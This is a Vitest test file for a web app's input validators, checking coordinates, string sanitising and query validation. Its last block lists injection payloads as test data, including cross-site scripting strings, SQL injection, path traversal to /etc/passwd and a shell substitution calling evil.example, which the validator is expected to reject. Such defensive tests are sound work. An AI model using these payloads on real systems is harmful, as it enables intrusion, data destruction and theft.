import { describe, it, expect } from "vitest";
import { validCoords, sanitize, validateString } from "@/_lib/validate";

describe("validCoords", () => {
  it.each([
    {
      lat: 54.6872,
      lon: 25.2797,
      expected: true,
      description: "accepts numeric coordinates that are in range",
    },
    {
      lat: "54.6872",
      lon: "25.2797",
      expected: true,
      description: "accepts strings that contain numeric values",
    },
    {
      lat: 0,
      lon: 0,
      expected: true,
      description: "accepts 0 as a value rather than treating is as missing",
    },
    {
      lat: -90,
      lon: -180,
      expected: true,
      description: "accepts boundary values",
    },
    {
      lat: 90.111111,
      lon: 0,
      expected: false,
      description: "rejects values that are outside valid range",
    },
    {
      lat: undefined,
      lon: 54.6872,
      expected: false,
      description: "rejects missing values",
    },
    {
      lat: "  ",
      lon: 54.6872,
      expected: false,
      description: "rejects blank values",
    },
    {
      lat: 54.6872,
      lon: "kaunas",
      expected: false,
      description: "rejects a string containing letters",
    },
    {
      lat: 54.6872,
      lon: NaN,
      expected: false,
      description: "rejects non-numeric values",
    },
  ])("$description -> $expected", ({ lat, lon, expected }) => {
    expect(validCoords(lat, lon)).toBe(expected);
  });
});

describe("sanitize", () => {
  it.each([
    {
      val: " Marijampole ",
      expected: "marijampole",
      description: "trims and lowercases string containing letters",
    },
    {
      val: "fishermans-wharf-mobile-home-park-7190590",
      expected: "fishermans-wharf-mobile-home-park-7190590",
      description: "accepts and returns valid location ids",
    },
    {
      val: " KaUnas-55-42 ",
      expected: "kaunas-55-42",
      description: "trims and lowercases string containing letters and numbers",
    },
    {
      val: " 88",
      expected: "88",
      description: "trims and transforms numbers to string",
    },
    {
      val: false,
      expected: "",
      description:
        "returns empty string for value that isn't typeof string and number",
    },
    {
      val: BigInt(9007199254740991),
      expected: "",
      description:
        "returns empty string for value that isn't typeof string and number",
    },
  ])("$description -> $expected", ({ val, expected }) => {
    expect(sanitize(val)).toBe(expected);
  });
});

describe("sanitize", () => {
  it("normalises case and whitespace without stripping markup", () => {
    expect(sanitize("  <SCRIPT>alert(1)</SCRIPT>  ")).toBe(
      "<script>alert(1)</script>",
    );
  });
  it("accepts interior newlines, because \\s matches them", () => {
    expect(validateString("vilnius\r\nkaunas", "q").message).toBe("");
  });

  it("accepts apostrophes, which real place names need", () => {
    expect(validateString("o'brien or 1", "q").message).toBe("");
  });
});

describe.each(["q", "param"] as const)("validateString(%s)", (type) => {
  it.each([
    {
      query: "Norbury",
      expected: {
        q: "",
        param: "",
      },
    },
    {
      query: "Å",
      expected: {
        q: "",
        param: "invalid_chars",
      },
    },
    {
      query: "",
      expected: {
        q: "too_short",
        param: "too_short",
      },
    },
    {
      query: "vilnius!",
      expected: {
        q: "invalid_chars",
        param: "invalid_chars",
      },
    },
    {
      query: "a".repeat(26),
      expected: {
        q: "too_long",
        param: "",
      },
    },
    {
      query: "a".repeat(106),
      expected: {
        q: "too_long",
        param: "too_long",
      },
    },
  ])("$query -> $expected", ({ query, expected }) => {
    expect(validateString(query, type).message).toBe(expected[type]);
  });
});

describe("validateString rejects injection payloads", () => {
  const payloads = [
    { query: "<script>alert(1)</script>", description: "a script tag" },
    {
      query: "<img src=x onerror=alert(1)>",
      description: "an onerror handler",
    },
    { query: '"><svg onload=alert(1)>', description: "an attribute breakout" },
    {
      query: "javascript:alert(document.cookie)",
      description: "a javascript: url",
    },
    {
      query: "'; DROP TABLE places; --",
      description: "a sql statement terminator",
    },
    { query: "' OR 1=1 --", description: "a sql tautology" },
    { query: "../../../etc/passwd", description: "path traversal" },
    { query: "%3Cscript%3E", description: "percent-encoded angle brackets" },
    {
      query: "{{constructor.constructor('alert(1)')()}}",
      description: "a template expression",
    },
    { query: "$(curl evil.example)", description: "shell substitution" },
    { query: "vilnius\u0000", description: "a null byte" },
    { query: "vilnius\u200b", description: "a zero-width space" },
  ];

  it.each(payloads)("q: rejects $description", ({ query }) => {
    expect(validateString(query, "q").message).toBe("invalid_chars");
  });

  it.each(payloads)("param: rejects $description", ({ query }) => {
    expect(validateString(query, "param").message).toBe("invalid_chars");
  });
});
